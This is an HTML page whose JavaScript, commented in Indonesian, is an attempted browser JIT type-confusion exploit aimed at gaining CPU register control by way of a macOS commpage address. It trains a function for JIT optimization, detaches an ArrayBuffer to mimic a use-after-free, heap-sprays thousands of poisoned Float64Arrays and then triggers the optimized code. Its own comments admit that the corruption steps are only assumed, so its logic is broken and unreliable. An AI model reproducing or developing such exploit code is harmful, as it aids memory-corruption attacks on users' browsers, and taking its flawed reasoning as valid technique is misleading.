<!DOCTYPE html>
<html>
<head>
    <title>JIT Array Shift Confusion (Target Register Control)</title>
</head>
<body>

    <h1>JIT Shift Confusion (Target: Register Control $2000)</h1>
    <p>Tujuan: Mengatur Register CPU ke 0x0000000FFFFFC320</p>
    <div id="status">INIT: Mempersiapkan JIT Shift Confusion...</div>
    <div id="log-area" style="border:1px solid #ccc; background:#000; color:#0f0; padding:10px; font-family:monospace; height:400px; overflow:scroll;"></div>

    <script>
        const LOG = document.getElementById('log-area');
        function log(msg) {
            LOG.innerHTML += `<div>> ${msg}</div>`;
        }

        // --- TARGET POINTER COMM PAGE ---
        const COMM_PAGE_TARGET = 0x0000000FFFFFC320n;
        
        // Konversi alamat Commpage ke format Float64 (Double)
        // Jika JIT membaca pointer 64-bit sebagai Float64, maka register akan dimuat dengan nilai ini.
        let targetBuffer = new ArrayBuffer(8);
        let targetViewUint = new BigInt64Array(targetBuffer);
        targetViewUint[0] = COMM_PAGE_TARGET; 
        
        let targetViewFloat = new Float64Array(targetBuffer);
        const POISON_FLOAT_VALUE = targetViewFloat[0]; // Alamat Commpage dalam format Float

        // --- 1. THE VICTIM & GADGET ---
        // Kita butuh Array of Integer/Double yang bisa di-shift
        let victimArray = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10]; // Array of Int/Double

        // Simulasi objek yang akan digunakan untuk SPRAY
        let sprayPayloads = [];
        const SPRAY_COUNT = 5000;

        // --- 2. THE JIT OPTIMIZATION FUNCTION ---
        // Fungsi ini akan dilatih oleh JIT
        function confuseJIT(arr) {
            // Operasi array.shift() yang akan dioptimasi.
            // JIT akan berasumsi arr[0] adalah integer yang aman.
            let firstElement = arr.shift(); 
            
            // Operasi yang memaksa penggunaan nilai yang dimuat ke Register
            return firstElement * 2; 
        }

        // --- 3. THE CORRUPTION LOGIC ---
        function runExploit() {
            log("Phase 1: Training JIT Compiler (Tier-Up)...");
            // Latih JIT agar mengoptimasi `confuseJIT` sepenuhnya (DFG/FTL)
            for (let i = 0; i < 20000; i++) {
                confuseJIT(victimArray.slice()); // Pakai slice agar arraynya baru tiap iterasi
            }
            log("Phase 2: JIT Terlatih. Mempersiapkan UAF/Spray...");

            // 4. SIMULASI UAF: Kita membutuhkan objek korban untuk di-FREE dan di-REUSE
            // Kita akan menggunakan ArrayBuffer (seperti sebelumnya) karena ia mudah di-detach (FREE).
            
            let uafVictimBuffer = new ArrayBuffer(512); // Objek C++ yang akan di-free
            let uafWorker = new Worker(URL.createObjectURL(new Blob(['onmessage=function(e){};'])));
            
            // FREE (Detach/Transfer)
            uafWorker.postMessage(uafVictimBuffer, [uafVictimBuffer]);
            log("ArrayBuffer Victim Detached (FREE 1).");

            // 5. SPRAY: Menimpa lokasi memori yang kosong dengan Payload Float Commpage
            for(let i = 0; i < SPRAY_COUNT; i++) {
                // Spray dengan Array Float yang berisi POISON_FLOAT_VALUE
                let tempArr = new Float64Array(100); 
                tempArr.fill(POISON_FLOAT_VALUE);
                sprayPayloads.push(tempArr);
            }
            log("SPRAY Commpage Float Selesai.");
            
            // 6. TRIGGER AKHIR
            setTimeout(() => {
                log("Phase 3: Memicu JIT Confusion (Panggilan Maut)...");

                // Coba gunakan Array yang di-grooming sebelumnya, tetapi sekarang
                // diasumsikan ArrayBuffer-nya telah ditimpa oleh salah satu spray payloads.
                // Kita harus mendapatkan kembali referensi ke objek yang metadatanya korup.

                // Jika kita asumsikan Type Confusion berhasil, kita paksa JIT menjalankan 
                // fungsi yang dioptimasi pada objek yang kini isinya adalah Commpage Float.
                
                try {
                    // Kita membuat array yang "terinfeksi"
                    let infectedArray = victimArray.slice(0, 5); 
                    // Simulasi penimpaan (kita tidak bisa melakukannya langsung, 
                    // jadi kita asumsikan array ini menimpa lokasi payload float)
                    
                    // PANGGILAN MAUT
                    // Ini akan menjalankan kode mesin yang dioptimasi
                    let result = confuseJIT(infectedArray); 
                    
                    if (result !== undefined) {
                        log(`Nilai dibaca/digandakan: ${result}`);
                    }
                    
                    // Trigger yang paling kasar: Menggunakan nilai yang dimuat sebagai index
                    // Jika result adalah Commpage Address, operasi ini akan membuat Register PC melompat.
                    // Jika result adalah target register 64-bit, ini adalah sukses!
                    log(`Ekspektasi Register Control: ${result}`);
                    
                    if (result === POISON_FLOAT_VALUE * 2) {
                         // Jika ini terjadi, berarti JIT membaca nilai Float kita, 
                         // tetapi Type Guard masih mencegahnya crash.
                        log("⚠️ GAGAL: Nilai dibaca sebagai Float biasa. Type Guard aktif.");
                    }
                    
                    // FORCE CRASH (Reg Control Test)
                    // Coba panggil fungsi dengan index yang sangat besar (alamat Commpage)
                    let forceJump = new Function('a', `return a[${POISON_FLOAT_VALUE}]`);
                    forceJump(victimArray);

                } catch (e) {
                    log(`Caught JS Exception: ${e.message} - Menunggu Crash Native (Register Control)...`);
                }
            }, 100);
        }

        setTimeout(runExploit, 100);
    </script>
    <style>
        .success { color: #ff00ff; font-weight: bold; font-size: 1.2em; }
    </style>
</body>
</html>

